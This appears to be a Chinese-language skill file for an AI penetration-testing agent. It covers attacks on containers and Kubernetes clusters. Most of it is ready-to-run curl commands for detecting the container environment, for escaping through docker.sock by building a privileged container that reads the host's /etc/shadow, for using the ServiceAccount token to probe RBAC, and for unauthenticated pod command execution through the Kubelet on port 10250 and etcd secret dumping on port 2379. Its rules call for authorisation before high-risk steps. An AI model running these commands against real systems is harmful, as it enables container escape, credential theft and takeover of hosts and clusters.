---
name: k8s-container
description: 渗透进入容器或 K8s 集群环境时使用：容器内环境识别（/proc/1/cgroup、/.dockerenv）、特权与危险挂载检查、docker.sock 逃逸、ServiceAccount Token + RBAC 探测、Kubelet 10250 与 etcd 2379 未授权访问；拿到容器内 shell、发现 6443/10250/2379 端口或云原生线索时想到它
---

## 用法

* 核心手法是 curl + /proc 检查，不依赖容器内预装任何工具；kubectl 相关命令仅当容器内已有 kubectl 时使用
* 先判断处境（容器内 / 集群网络可达 / 持 SA Token），再选对应路径
* 更多手法细节用 knowledge-search 技能查 hacktricks-cloud

确认是否在容器/K8s 内：

```bash
cat /proc/1/cgroup | grep -i 'docker\|kubepods\|containerd'; ls /.dockerenv 2>/dev/null
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
env | grep -i kube
```

逃逸条件快查（特权、docker.sock、危险挂载）：

```bash
grep CapEff /proc/1/status; ls -la /var/run/docker.sock 2>/dev/null
mount | grep -v 'overlay\|proc\|sysfs\|cgroup\|tmpfs\|devpts\|mqueue'
```

docker.sock 逃逸（容器内没有 docker CLI，用 curl 建特权容器挂宿主根）：

```bash
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d '{"Image":"<现有镜像>","Cmd":["cat","/mnt/etc/shadow"],"HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}'
```

返回的 Id 依次 `POST /containers/<Id>/start`、`GET /containers/<Id>/logs?stdout=true` 取回输出。

SA Token + RBAC 探测（等效 kubectl auth can-i --list；若容器内有 kubectl 可直接用）：

```bash
SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
curl -sk -H "Authorization: Bearer $SA_TOKEN" $APISERVER/api/v1/namespaces
curl -sk -H "Authorization: Bearer $SA_TOKEN" -H "Content-Type: application/json" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

Kubelet 未授权（10250，列 Pod、在任意 Pod 执行命令）：

```bash
curl -sk https://<node>:10250/pods
curl -sk https://<node>:10250/run/<namespace>/<pod>/<container> -d "cmd=id"
```

etcd 未授权（2379，可能含全量 Secrets）：

```bash
curl -s http://<node>:2379/version
curl -s "http://<node>:2379/v2/keys/" | head -50
```

## 规则

- 只读探测（GET、/proc 检查）先行；创建 Pod、挂载逃逸、写 crontab 等高危动作必须有明确授权
- CapEff 为 `0000003fffffffff` 即特权容器，优先走挂载宿主根路径，比内核漏洞可靠得多
- 探测结果落盘 `k8s/` 子目录（权限清单、Pod 列表、API 响应）；SA Token 属凭据，同步记录到 `creds/`
- 用 docker.sock 创建容器时复用目标已有镜像，不要从外网拉新镜像引入变量
- 内核 CVE 逃逸（DirtyPipe 等）放最后：先用配置错误路径，且确认授权范围允许影响宿主机
